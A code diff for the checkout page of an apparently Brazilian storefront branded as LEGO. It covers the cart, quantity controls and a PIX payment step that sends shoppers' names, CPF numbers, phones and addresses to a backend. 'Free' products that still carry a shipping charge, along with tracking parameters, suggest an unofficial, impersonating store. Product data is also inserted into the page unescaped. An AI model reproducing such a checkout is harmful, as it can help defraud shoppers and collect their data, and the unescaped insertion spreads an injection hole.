@@ -663,416 +663,253 @@
             showStep('address');
         }
 
+        function getProductData() {
+            // Replicando exatamente a lógica do React: localStorage.getItem("checkoutProduct")
+            const checkoutData = localStorage.getItem("checkoutProduct");
+            if (checkoutData) {
+                const item = JSON.parse(checkoutData);
+                return {
+                    id: 1,
+                    name: item.name,
+                    price: item.finalPrice, // Usando finalPrice como no React
+                    originalPrice: item.originalPrice,
+                    isFree: item.isFree,
+                    image: item.image,
+                    quantity: 1,
+                    description: "Produto fornecido e entregue por legobrasil",
+                    discount: item.discount || 0
+                };
+            }
+            
+            // Fallback se não encontrar dados
+            return {
+                id: 1,
+                name: 'Produto LEGO',
+                price: 0,
+                originalPrice: 0,
+                isFree: false,
+                image: '/placeholder.svg?height=100&width=100',
+                quantity: 1,
+                description: "Produto fornecido e entregue por legobrasil",
+                discount: 0
+            };
+        }
+
         function populateCart() {
             const productData = getProductData();
             const cartProductElement = document.getElementById('cartProduct');
             const cartSubtotalElement = document.getElementById('cartSubtotal');
             const cartTotalElement = document.getElementById('cartTotal');
             
-            console.log('[v0] Product data loaded:', productData); // Debug
+            console.log('[v0] Product data loaded:', productData);
             
-            if (cartProductElement) {
+            if (cartProductElement && productData) {
                 let productHTML = `
-                    <div class="flex items-center gap-4">
-                        <img src="${productData.image}" alt="${productData.name}" class="w-16 h-16 rounded object-cover" onerror="this.src='/placeholder.svg?height=64&width=64'">
+                    <div class="flex gap-3 mb-6">
+                        <img src="${productData.image || '/placeholder.svg?height=64&width=64'}" alt="${productData.name}" class="w-16 h-16 object-cover rounded">
                         <div class="flex-1">
-                            <h3 class="font-semibold text-gray-900">${productData.name}</h3>
-                            <p class="text-sm text-gray-600">Produto fornecido e entregue por legobrasil</p>
-                            <div class="flex items-center gap-3 mt-2">
-                                <button class="w-8 h-8 border border-gray-300 rounded flex items-center justify-center hover:bg-gray-50" onclick="updateQuantity(-1)">
-                                    <span class="text-lg">−</span>
-                                </button>
-                                <span id="productQuantity" class="font-medium">1</span>
-                                <button class="w-8 h-8 border border-gray-300 rounded flex items-center justify-center hover:bg-gray-50" onclick="updateQuantity(1)">
-                                    <span class="text-lg">+</span>
+                            <div class="flex justify-between items-start mb-1">
+                                <h3 class="text-sm font-medium text-gray-900 leading-tight">${productData.name}</h3>
+                                <button onclick="removeProduct()" class="text-blue-500 p-1">
+                                    <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                                    </svg>
                                 </button>
                             </div>
-                        </div>
-                        <div class="text-right">
+                            <p class="text-xs text-gray-500 mb-2">${productData.description}</p>
+                            
+                            <div class="flex justify-between items-center">
+                                <div class="flex items-center gap-2">
+                                    <button onclick="updateQuantity(-1)" class="w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center">
+                                        <span style="font-size: 12px;">−</span>
+                                    </button>
+                                    <span id="productQuantity" class="text-sm font-medium">${productData.quantity}</span>
+                                    <button onclick="updateQuantity(1)" class="w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center">
+                                        <span style="font-size: 12px;">+</span>
+                                    </button>
+                                </div>
+                                
+                                <div class="text-right">
                 `;
-                
-                if (productData.discount > 0 && productData.originalPrice) {
-                    productHTML += `
-                        <div class="text-sm text-gray-500 line-through">${formatCurrency(Math.round(productData.originalPrice * 100))}</div>
-                        <div class="text-lg font-bold text-green-600">${formatCurrency(Math.round(productData.price * 100))}</div>
-                        <div class="text-xs text-green-600">-${productData.discount}% OFF</div>
-                    `;
+        
+                if (productData.isFree) {
+                    productHTML += `<span class="text-sm font-semibold text-green-600">GRÁTIS</span>`;
                 } else {
-                    productHTML += `<div class="text-lg font-bold">${formatCurrency(Math.round(productData.price * 100))}</div>`;
+                    productHTML += `<span class="text-sm font-semibold">R$ ${(productData.price).toFixed(2).replace('.', ',')}</span>`;
                 }
-                
+        
                 productHTML += `
+                                </div>
+                            </div>
                         </div>
-                        <button class="text-blue-600 hover:text-blue-800 ml-2" onclick="removeProduct()">
-                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
-                            </svg>
-                        </button>
                     </div>
                 `;
-                
+        
                 cartProductElement.innerHTML = productHTML;
-                
-                const price = Math.round(productData.price * 100);
-                cartSubtotalElement.textContent = formatCurrency(price);
-                cartTotalElement.textContent = formatCurrency(price);
+        
+                const subtotal = productData.price * productData.quantity;
+                cartSubtotalElement.textContent = `R$ ${subtotal.toFixed(2).replace('.', ',')}`;
+                cartTotalElement.textContent = `R$ ${subtotal.toFixed(2).replace('.', ',')}`;
             }
         }
 
-        function toggleDeliveryOption(option) {
+        function updateQuantity(change) {
+            const quantityElement = document.getElementById('productQuantity');
+            if (!quantityElement) return;
+            
+            let quantity = parseInt(quantityElement.textContent) + change;
+            if (quantity < 1) quantity = 1;
+            if (quantity > 10) quantity = 10;
+            
+            quantityElement.textContent = quantity;
+            
+            // Atualizar totais
+            const productData = getProductData();
+            const subtotal = productData.price * quantity;
+            document.getElementById('cartSubtotal').textContent = `R$ ${subtotal.toFixed(2).replace('.', ',')}`;
+            document.getElementById('cartTotal').textContent = `R$ ${subtotal.toFixed(2).replace('.', ',')}`;
+        }
+
+        function removeProduct() {
+            if (confirm('Deseja remover este produto do carrinho?')) {
+                localStorage.removeItem('checkoutProduct');
+                window.location.href = '/';
+            }
+        }
+
+        async function processCheckout() {
+            console.log('[v0] Iniciando processo de pagamento LEGO...');
+            
+            try {
+                const utmParams = getUtmParams();
+                const productData = getProductData();
+                const quantity = parseInt(document.getElementById('productQuantity')?.textContent || 1);
+                const productPrice = Math.round(productData.price * 100) * quantity; // Converter para centavos
+                const shippingPrice = parseInt(formData.shippingPrice || 0);
+                const totalAmount = productPrice + shippingPrice;
+        
+                const btn = document.getElementById('finalizeBtn');
+        
+                // Loading state
+                btn.innerHTML = '<div class="loading-spinner mx-auto"></div>';
+                btn.disabled = true;
+
+                // Preparar dados para API PIX usando estrutura correta
+                const paymentData = {
+                    nome: `${formData.firstName} ${formData.lastName}`,
+                    email: formData.email,
+                    cpf: formData.cpf?.replace(/\D/g, '') || '',
+                    telefone: formData.phone?.replace(/\D/g, '') || '',
+                    endereco: formData.address?.street || '',
+                    numero: formData.addressNumber || '',
+                    complemento: formData.complement || '',
+                    bairro: formData.address?.neighborhood || '',
+                    cidade: formData.address?.city || '',
+                    estado: formData.address?.state || '',
+                    cep: formData.address?.zipcode || '',
+                    amount: totalAmount
+                };
+
+                console.log('📤 Enviando dados para API PIX:', paymentData);
+
+                const response = await fetch(`${API_BASE_URL}/pagamento.php`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(paymentData)
+                });
+
+                const data = await response.json();
+                console.log('📥 Resposta da API PIX:', data);
+
+                if (data.success) {
+                    const params = new URLSearchParams({
+                        token: data.token,
+                        qrcode: data.pixCopiaECola || data.pixCode,
+                        amount: (totalAmount / 100).toFixed(2),
+                        name: paymentData.nome,
+                        email: formData.email,
+                        productName: productData.name,
+                        productImage: productData.image,
+                        ...utmParams
+                    });
+            
+                    console.log('🔄 Redirecionando para PIX...');
+                    window.location.href = `pix.html?${params.toString()}`;
+                } else {
+                    throw new Error(data.message || 'Erro ao gerar PIX');
+                }
+
+            } catch (error) {
+                console.error('❌ Erro no checkout LEGO:', error);
+        
+                const btn = document.getElementById('finalizeBtn');
+                btn.innerHTML = `
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                    </svg>
+                    Finalizar compra
+                `;
+                btn.disabled = false;
+        
+                showToast('Erro ao processar pagamento: ' + error.message, 'error');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('✅ Checkout LEGO carregado');
+    
+            // Carregar dados do produto
+            populateCart();
+    
+            // Mostrar step inicial
+            showStep('cart');
+    
+            // Event listeners únicos
+            const continueEmailBtn = document.getElementById('continueEmailBtn');
+            const continuePersonalBtn = document.getElementById('continuePersonalBtn');
+            const continueAddressBtn = document.getElementById('continueAddressBtn');
+            const finalizeBtn = document.getElementById('finalizeBtn');
+            const calculateBtn = document.getElementById('calculateBtn');
+            const closeOrderBtn = document.getElementById('closeOrderBtn');
+            const calculateDeliveryBtn = document.getElementById('calculateDeliveryBtn');
             const receberBtn = document.getElementById('receberBtn');
             const retirarBtn = document.getElementById('retirarBtn');
-            const cepSection = document.querySelector('#step-address .mb-4:has(#cep)');
-            const shippingOptions = document.getElementById('shippingOptions');
-            
-            if (option === 'receber') {
-                receberBtn.classList.add('bg-blue-600', 'text-white');
-                receberBtn.classList.remove('text-gray-600');
-                retirarBtn.classList.remove('bg-blue-600', 'text-white');
-                retirarBtn.classList.add('text-gray-600');
-                
-                // Mostrar seção de CEP
-                if (cepSection) cepSection.style.display = 'block';
-                
-                // Esconder opções de retirada se estavam visíveis
-                if (shippingOptions && !shippingOptions.classList.contains('hidden')) {
-                    const currentOptions = document.querySelectorAll('#shippingList input[type="radio"]');
-                    const hasRetirada = Array.from(currentOptions).some(input => 
-                        input.closest('label').textContent.includes('Retirada')
-                    );
-                    if (hasRetirada) {
-                        shippingOptions.classList.add('hidden');
-                    }
-                }
-                
-            } else if (option === 'retirar') {
-                retirarBtn.classList.add('bg-blue-600', 'text-white');
-                retirarBtn.classList.remove('text-gray-600');
-                receberBtn.classList.remove('bg-blue-600', 'text-white');
-                receberBtn.classList.add('text-gray-600');
-                
-                // Esconder seção de CEP
-                if (cepSection) cepSection.style.display = 'none';
-                
-                // Mostrar apenas opção de retirada
-                showPickupOption();
+    
+            if (continueEmailBtn) continueEmailBtn.addEventListener('click', continueFromEmail);
+            if (continuePersonalBtn) continuePersonalBtn.addEventListener('click', continueFromPersonal);
+            if (continueAddressBtn) continueAddressBtn.addEventListener('click', continueFromAddress);
+            if (finalizeBtn) finalizeBtn.addEventListener('click', processCheckout);
+            if (calculateBtn) calculateBtn.addEventListener('click', calculateShipping);
+            if (closeOrderBtn) closeOrderBtn.addEventListener('click', () => showStep('email'));
+            if (calculateDeliveryBtn) calculateDeliveryBtn.addEventListener('click', () => showStep('email'));
+            if (receberBtn) receberBtn.addEventListener('click', () => toggleDeliveryOption('receber'));
+            if (retirarBtn) retirarBtn.addEventListener('click', () => toggleDeliveryOption('retirar'));
+    
+            // Formatação de campos
+            const cpfInput = document.getElementById('cpf');
+            const phoneInput = document.getElementById('phone');
+            const cepInput = document.getElementById('cep');
+    
+            if (cpfInput) {
+                cpfInput.addEventListener('input', function(e) {
+                    e.target.value = formatCPF(e.target.value);
+                });
             }
-        }
-
-        function showPickupOption() {
-            const shippingOptions = document.getElementById('shippingOptions');
-            const shippingList = document.getElementById('shippingList');
-            
-            const pickupHTML = `
-                <label class="flex items-center justify-between p-3 border rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
-                    <div class="flex items-center gap-3">
-                        <input type="radio" name="shipping" value="0" class="w-4 h-4 text-blue-600" onchange="selectShipping('Retirada', 0)" checked>
-                        <div>
-                            <div class="font-medium">Retirada</div>
-                            <div class="text-sm text-gray-600">Disponível hoje</div>
-                        </div>
-                    </div>
-                    <div class="font-semibold">Grátis</div>
-                </label>
-            `;
-            
-            shippingList.innerHTML = pickupHTML;
-            shippingOptions.classList.remove('hidden');
-            
-            // Animação de entrada
-            setTimeout(() => {
-                shippingOptions.classList.remove('opacity-0');
-                shippingOptions.classList.add('opacity-100');
-            }, 50);
-            
-            // Auto-selecionar retirada e habilitar botão
-            formData.shippingName = 'Retirada';
-            formData.shippingPrice = 0;
-            document.getElementById('continueAddressBtn').disabled = false;
-        }
-
-        function showShippingOptions() {
-            const shippingOptions = document.getElementById('shippingOptions');
-            const shippingList = document.getElementById('shippingList');
-            const productData = getProductData();
-            
-            // Se produto é 100% grátis, mostrar apenas PAC
-            let options;
-            if (productData.discount === 100 || productData.price === 0) {
-                options = [
-                    { name: 'PAC', price: 1500, days: '8 a 12 dias úteis' }
-                ];
-            } else {
-                options = [
-                    { name: 'PAC', price: 1500, days: '8 a 12 dias úteis' },
-                    { name: 'SEDEX', price: 2500, days: '3 a 5 dias úteis' },
-                    { name: 'Retirada', price: 0, days: 'Disponível hoje' }
-                ];
+    
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function(e) {
+                    e.target.value = formatPhone(e.target.value);
+                });
             }
-            
-            let optionsHTML = '';
-            options.forEach((option, index) => {
-                optionsHTML += `
-                    <label class="flex items-center justify-between p-3 border rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
-                        <div class="flex items-center gap-3">
-                            <input type="radio" name="shipping" value="${option.price}" class="w-4 h-4 text-blue-600" onchange="selectShipping('${option.name}', ${option.price})">
-                            <div>
-                                <div class="font-medium">${option.name}</div>
-                                <div class="text-sm text-gray-600">${option.days}</div>
-                            </div>
-                        </div>
-                        <div class="font-semibold">${option.price === 0 ? 'Grátis' : formatCurrency(option.price)}</div>
-                    </label>
-                `;
-            });
-            
-            shippingList.innerHTML = optionsHTML;
-            shippingOptions.classList.remove('hidden');
-            
-            // Animação de entrada
-            setTimeout(() => {
-                shippingOptions.classList.remove('opacity-0');
-                shippingOptions.classList.add('opacity-100');
-            }, 50);
-        }
-
-        function selectShipping(shippingName, shippingPrice) {
-            formData.shippingName = shippingName;
-            formData.shippingPrice = shippingPrice;
-            
-            // Mostrar campos de endereço com animação apenas se não for retirada
-            if (shippingName !== 'Retirada') {
-                const addressDetails = document.getElementById('addressDetails');
-                addressDetails.classList.remove('hidden');
-                
-                setTimeout(() => {
-                    addressDetails.classList.remove('opacity-0');
-                    addressDetails.classList.add('opacity-100');
-                }, 50);
-            } else {
-                // Esconder campos de endereço se for retirada
-                const addressDetails = document.getElementById('addressDetails');
-                addressDetails.classList.add('hidden', 'opacity-0');
-                addressDetails.classList.remove('opacity-100');
+    
+            if (cepInput) {
+                cepInput.addEventListener('input', function(e) {
+                    e.target.value = formatCEP(e.target.value);
+                });
             }
-            
-            // Habilitar botão de continuar
-            document.getElementById('continueAddressBtn').disabled = false;
-        }
-
-        function updatePersonalSummary() {
-            const personalSummary = document.getElementById('personal-summary');
-            const personalSummaryPayment = document.getElementById('personal-summary-payment');
-            
-            if (formData.firstName && formData.email && formData.cpf) {
-                const summaryText = `${formData.firstName} ${formData.lastName || ''} • ${formData.email} • ${formData.cpf}`;
-                if (personalSummary) personalSummary.textContent = summaryText;
-                if (personalSummaryPayment) personalSummaryPayment.textContent = summaryText;
-            }
-        }
-
-        // Função para mostrar step específico
-        function showStep(stepName) {
-            // Esconder todos os steps
-            document.querySelectorAll('.step-content').forEach(step => {
-                step.classList.add('hidden');
-            });
-            
-            // Mostrar step atual
-            const targetStep = document.getElementById(`step-${stepName}`);
-            if (targetStep) {
-                targetStep.classList.remove('hidden');
-                currentStep = stepName;
-            }
-            
-            if (stepName === 'payment') {
-                updatePaymentSummary();
-            }
-        }
-
-        // Função para validar email
-        function validateEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
-        }
-
-        // Função para continuar do step de email
-        function continueFromEmail() {
-            const emailInput = document.getElementById('email-step');
-            const email = emailInput.value.trim();
-            
-            if (!email) {
-                showToast('Por favor, informe seu e-mail', 'error');
-                return;
-            }
-            
-            if (!validateEmail(email)) {
-                showToast('Por favor, informe um e-mail válido', 'error');
-                return;
-            }
-            
-            // Salvar email nos dados do formulário
-            formData.email = email;
-            
-            // Preencher email no step de dados pessoais
-            document.getElementById('email-display').value = email;
-            
-            // Ir para próximo step
-            showStep('personal');
-        }
-
-        function continueFromPersonal() {
-            const firstName = document.getElementById('firstName').value.trim();
-            const lastName = document.getElementById('lastName').value.trim();
-            const cpf = document.getElementById('cpf').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-            
-            // Validações básicas
-            if (!firstName) {
-                showToast('Por favor, informe seu primeiro nome', 'error');
-                return;
-            }
-            
-            if (!lastName) {
-                showToast('Por favor, informe seu último nome', 'error');
-                return;
-            }
-            
-            if (!cpf) {
-                showToast('Por favor, informe seu CPF', 'error');
-                return;
-            }
-            
-            if (!validateCPF(cpf)) {
-                showToast('Por favor, informe um CPF válido', 'error');
-                return;
-            }
-            
-            if (!phone) {
-                showToast('Por favor, informe seu telefone', 'error');
-                return;
-            }
-            
-            if (!validatePhone(phone)) {
-                showToast('Por favor, informe um telefone válido', 'error');
-                return;
-            }
-            
-            // Salvar dados pessoais
-            formData.firstName = firstName;
-            formData.lastName = lastName;
-            formData.cpf = cpf;
-            formData.phone = phone;
-            formData.fullName = `${firstName} ${lastName}`;
-            
-            // Atualizar resumo
-            updatePersonalSummary();
-            
-            // Ir para próximo step
-            showStep('address');
-        }
-
-        // Função para continuar do step de endereço
-        function continueFromAddress() {
-            // Validar se tem frete selecionado
-            const selectedShipping = document.querySelector('input[name="shipping"]:checked');
-            if (!selectedShipping) {
-                showToast('Por favor, selecione uma forma de entrega', 'error');
-                return;
-            }
-            
-            // Validar número do endereço
-            const addressNumber = document.getElementById('addressNumber').value.trim();
-            if (!addressNumber) {
-                showToast('Por favor, informe o número do endereço', 'error');
-                return;
-            }
-            
-            // Salvar dados de entrega
-            formData.shippingMethod = selectedShipping.value;
-            formData.shippingPrice = selectedShipping.dataset.price;
-            formData.addressNumber = addressNumber;
-            formData.complement = document.getElementById('complement').value.trim();
-            
-            // Atualizar resumos
-            updatePaymentSummary();
-            
-            // Ir para próximo step
-            showStep('payment');
-        }
-
-        function updatePaymentSummary() {
-            const summaryElement = document.getElementById('orderSummary');
-            if (summaryElement) {
-                const productData = getProductData();
-                const productPrice = Math.round(productData.price * 100); // Converter para centavos
-                const shippingPrice = parseInt(formData.shippingPrice || 0);
-                const total = productPrice + shippingPrice;
-                
-                let summaryHTML = '';
-                
-                // Mostrar preço original se houver desconto
-                if (productData.discount > 0 && productData.originalPrice) {
-                    const originalPrice = Math.round(productData.originalPrice * 100);
-                    summaryHTML += `
-                        <div class="flex justify-between items-center py-2">
-                            <div class="flex items-center gap-3">
-                                <img src="${productData.image}" alt="${productData.name}" class="w-12 h-12 rounded object-cover">
-                                <span>${productData.name}</span>
-                            </div>
-                            <div class="text-right">
-                                <span class="line-through text-gray-500 text-sm">${formatCurrency(originalPrice)}</span>
-                                <br>
-                                <span class="text-green-600 font-semibold">${formatCurrency(productPrice)} (-${productData.discount}%)</span>
-                            </div>
-                        </div>
-                    `;
-                } else {
-                    summaryHTML += `
-                        <div class="flex justify-between items-center py-2">
-                            <div class="flex items-center gap-3">
-                                <img src="${productData.image}" alt="${productData.name}" class="w-12 h-12 rounded object-cover">
-                                <span>${productData.name}</span>
-                            </div>
-                            <span>${formatCurrency(productPrice)}</span>
-                        </div>
-                    `;
-                }
-                
-                summaryHTML += `
-                    <div class="flex justify-between items-center py-2">
-                        <span>Frete</span>
-                        <span>${formatCurrency(shippingPrice)}</span>
-                    </div>
-                    <div class="flex justify-between items-center py-2 font-semibold border-t">
-                        <span>Total</span>
-                        <span>${formatCurrency(total)}</span>
-                    </div>
-                `;
-                
-                summaryElement.innerHTML = summaryHTML;
-            }
-        }
-
-        // Função para ir para um step específico (para botões de editar)
-        function goToStep(stepName) {
-            showStep(stepName);
-        }
-
-        // Captura parâmetros UTM da URL
-        function getUtmParams() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return {
-                utm_source: urlParams.get('utm_source'),
-                utm_medium: urlParams.get('utm_medium'),
-                utm_campaign: urlParams.get('utm_campaign'),
-                utm_content: urlParams.get('utm_content'),
-                utm_term: urlParams.get('utm_term'),
-                xcod: urlParams.get('xcod'),
-                sck: urlParams.get('sck'),
-                utm_id: urlParams.get('utm_id')
-            };
-        }
+        });
 
         // Formatação de valores
         function formatCurrency(value) {
@@ -1112,873 +949,6 @@
                 }, 300);
             }, 4000);
         }
-
-        async function processCheckout() {
-            console.log('[v0] Iniciando processo de pagamento LEGO...');
-            
-            try {
-                // Capturar dados do formulário
-                const utmParams = getUtmParams();
-                const productData = getProductData();
-                const productPrice = Math.round(productData.price * 100); // Converter para centavos
-                const shippingPrice = parseInt(formData.shippingPrice || 0);
-                const totalAmount = productPrice + shippingPrice;
-                
-                const btn = document.getElementById('finalizeBtn');
-                const originalText = btn.textContent;
-                
-                // Loading state
-                btn.innerHTML = '<div class="loading-spinner mx-auto"></div>';
-                btn.disabled = true;
-
-                // Preparar dados para API PIX
-                const paymentData = {
-                    nome: formData.name,
-                    email: formData.email,
-                    cpf: formData.cpf?.replace(/\D/g, '') || '',
-                    telefone: formData.phone?.replace(/\D/g, '') || '',
-                    endereco: formData.address,
-                    numero: formData.number,
-                    complemento: formData.complement || '',
-                    bairro: formData.neighborhood,
-                    cidade: formData.city,
-                    estado: formData.state,
-                    cep: formData.cep,
-                    amount: totalAmount
-                };
-
-                console.log('📤 Enviando dados para API PIX:', {
-                    produto: productData.name,
-                    valor: totalAmount,
-                    dados: paymentData
-                });
-
-                const response = await fetch(`${API_BASE_URL}/pagamento.php`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(paymentData)
-                });
-
-                const data = await response.json();
-                console.log('📥 Resposta da API PIX:', data);
-
-                if (data.success) {
-                    const params = new URLSearchParams({
-                        token: data.token,
-                        qrcode: data.pixCopiaECola || data.pixCode,
-                        pixKey: 'lego@store.com.br',
-                        amount: (totalAmount / 100).toFixed(2), // Passando em reais
-                        name: formData.name,
-                        email: formData.email,
-                        productName: productData.name,
-                        productImage: productData.image,
-                        ...utmParams
-                    });
-                    
-                    console.log('🔄 Redirecionando para PIX com dados processados...');
-                    window.location.href = `pix.html?${params.toString()}`;
-                } else {
-                    throw new Error(data.message || 'Erro ao gerar PIX');
-                }
-
-            } catch (error) {
-                console.error('❌ Erro no checkout LEGO:', error);
-                
-                // Restaurar botão
-                const btn = document.getElementById('finalizeBtn');
-                btn.textContent = 'Finalizar Compra';
-                btn.disabled = false;
-                
-                alert('Erro ao processar pagamento: ' + error.message);
-            }
-        }
-
-        function showStep(stepName) {
-            // Esconder todos os steps
-            document.querySelectorAll('.step-content').forEach(step => {
-                step.classList.add('hidden');
-            });
-            
-            // Mostrar step atual
-            const targetStep = document.getElementById(`step-${stepName}`);
-            if (targetStep) {
-                targetStep.classList.remove('hidden');
-                currentStep = stepName;
-            }
-            
-            if (stepName === 'payment') {
-                updatePaymentSummary();
-            }
-        }
-
-        function getProductData() {
-            const urlParams = new URLSearchParams(window.location.search);
-            
-            // Tentar obter dados da URL primeiro
-            let productData = {
-                name: urlParams.get('productName'),
-                price: parseFloat(urlParams.get('price')),
-                image: urlParams.get('image'),
-                discount: parseFloat(urlParams.get('discount')) || 0
-            };
-            
-            // Se não conseguir da URL, tentar localStorage
-            if (!productData.name || !productData.price) {
-                const storedProduct = localStorage.getItem('selectedProduct');
-                if (storedProduct) {
-                    const parsed = JSON.parse(storedProduct);
-                    productData = {
-                        name: parsed.name || productData.name,
-                        price: parsed.price || productData.price,
-                        image: parsed.image || productData.image,
-                        discount: parsed.discount || productData.discount || 0
-                    };
-                }
-            }
-            
-            // Aplicar desconto se houver
-            if (productData.discount > 0) {
-                productData.originalPrice = productData.price;
-                productData.price = productData.price * (1 - productData.discount / 100);
-            }
-            
-            // Fallback para valores padrão apenas se realmente não conseguir obter dados
-            return {
-                name: productData.name || 'Produto LEGO',
-                price: productData.price || 0,
-                originalPrice: productData.originalPrice,
-                image: productData.image || '/placeholder.svg?height=100&width=100',
-                discount: productData.discount || 0
-            };
-        }
-
-        function calculateDeliveryFromCart() {
-            showStep('address');
-        }
-
-        function populateCart() {
-            const productData = getProductData();
-            const cartProductElement = document.getElementById('cartProduct');
-            const cartSubtotalElement = document.getElementById('cartSubtotal');
-            const cartTotalElement = document.getElementById('cartTotal');
-            
-            console.log('[v0] Product data loaded:', productData); // Debug
-            
-            if (cartProductElement) {
-                let productHTML = `
-                    <div class="flex items-center gap-4">
-                        <img src="${productData.image}" alt="${productData.name}" class="w-16 h-16 rounded object-cover" onerror="this.src='/placeholder.svg?height=64&width=64'">
-                        <div class="flex-1">
-                            <h3 class="font-semibold text-gray-900">${productData.name}</h3>
-                            <p class="text-sm text-gray-600">Produto fornecido e entregue por legobrasil</p>
-                            <div class="flex items-center gap-3 mt-2">
-                                <button class="w-8 h-8 border border-gray-300 rounded flex items-center justify-center hover:bg-gray-50" onclick="updateQuantity(-1)">
-                                    <span class="text-lg">−</span>
-                                </button>
-                                <span id="productQuantity" class="font-medium">1</span>
-                                <button class="w-8 h-8 border border-gray-300 rounded flex items-center justify-center hover:bg-gray-50" onclick="updateQuantity(1)">
-                                    <span class="text-lg">+</span>
-                                </button>
-                            </div>
-                        </div>
-                        <div class="text-right">
-                `;
-                
-                if (productData.discount > 0 && productData.originalPrice) {
-                    productHTML += `
-                        <div class="text-sm text-gray-500 line-through">${formatCurrency(Math.round(productData.originalPrice * 100))}</div>
-                        <div class="text-lg font-bold text-green-600">${formatCurrency(Math.round(productData.price * 100))}</div>
-                        <div class="text-xs text-green-600">-${productData.discount}% OFF</div>
-                    `;
-                } else {
-                    productHTML += `<div class="text-lg font-bold">${formatCurrency(Math.round(productData.price * 100))}</div>`;
-                }
-                
-                productHTML += `
-                        </div>
-                        <button class="text-blue-600 hover:text-blue-800 ml-2" onclick="removeProduct()">
-                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
-                            </svg>
-                        </button>
-                    </div>
-                `;
-                
-                cartProductElement.innerHTML = productHTML;
-                
-                const price = Math.round(productData.price * 100);
-                cartSubtotalElement.textContent = formatCurrency(price);
-                cartTotalElement.textContent = formatCurrency(price);
-            }
-        }
-
-        function toggleDeliveryOption(option) {
-            const receberBtn = document.getElementById('receberBtn');
-            const retirarBtn = document.getElementById('retirarBtn');
-            const cepSection = document.querySelector('#step-address .mb-4:has(#cep)');
-            const shippingOptions = document.getElementById('shippingOptions');
-            
-            if (option === 'receber') {
-                receberBtn.classList.add('bg-blue-600', 'text-white');
-                receberBtn.classList.remove('text-gray-600');
-                retirarBtn.classList.remove('bg-blue-600', 'text-white');
-                retirarBtn.classList.add('text-gray-600');
-                
-                // Mostrar seção de CEP
-                if (cepSection) cepSection.style.display = 'block';
-                
-                // Esconder opções de retirada se estavam visíveis
-                if (shippingOptions && !shippingOptions.classList.contains('hidden')) {
-                    const currentOptions = document.querySelectorAll('#shippingList input[type="radio"]');
-                    const hasRetirada = Array.from(currentOptions).some(input => 
-                        input.closest('label').textContent.includes('Retirada')
-                    );
-                    if (hasRetirada) {
-                        shippingOptions.classList.add('hidden');
-                    }
-                }
-                
-            } else if (option === 'retirar') {
-                retirarBtn.classList.add('bg-blue-600', 'text-white');
-                retirarBtn.classList.remove('text-gray-600');
-                receberBtn.classList.remove('bg-blue-600', 'text-white');
-                receberBtn.classList.add('text-gray-600');
-                
-                // Esconder seção de CEP
-                if (cepSection) cepSection.style.display = 'none';
-                
-                // Mostrar apenas opção de retirada
-                showPickupOption();
-            }
-        }
-
-        function showPickupOption() {
-            const shippingOptions = document.getElementById('shippingOptions');
-            const shippingList = document.getElementById('shippingList');
-            
-            const pickupHTML = `
-                <label class="flex items-center justify-between p-3 border rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
-                    <div class="flex items-center gap-3">
-                        <input type="radio" name="shipping" value="0" class="w-4 h-4 text-blue-600" onchange="selectShipping('Retirada', 0)" checked>
-                        <div>
-                            <div class="font-medium">Retirada</div>
-                            <div class="text-sm text-gray-600">Disponível hoje</div>
-                        </div>
-                    </div>
-                    <div class="font-semibold">Grátis</div>
-                </label>
-            `;
-            
-            shippingList.innerHTML = pickupHTML;
-            shippingOptions.classList.remove('hidden');
-            
-            // Animação de entrada
-            setTimeout(() => {
-                shippingOptions.classList.remove('opacity-0');
-                shippingOptions.classList.add('opacity-100');
-            }, 50);
-            
-            // Auto-selecionar retirada e habilitar botão
-            formData.shippingName = 'Retirada';
-            formData.shippingPrice = 0;
-            document.getElementById('continueAddressBtn').disabled = false;
-        }
-
-        function showShippingOptions() {
-            const shippingOptions = document.getElementById('shippingOptions');
-            const shippingList = document.getElementById('shippingList');
-            const productData = getProductData();
-            
-            // Se produto é 100% grátis, mostrar apenas PAC
-            let options;
-            if (productData.discount === 100 || productData.price === 0) {
-                options = [
-                    { name: 'PAC', price: 1500, days: '8 a 12 dias úteis' }
-                ];
-            } else {
-                options = [
-                    { name: 'PAC', price: 1500, days: '8 a 12 dias úteis' },
-                    { name: 'SEDEX', price: 2500, days: '3 a 5 dias úteis' },
-                    { name: 'Retirada', price: 0, days: 'Disponível hoje' }
-                ];
-            }
-            
-            let optionsHTML = '';
-            options.forEach((option, index) => {
-                optionsHTML += `
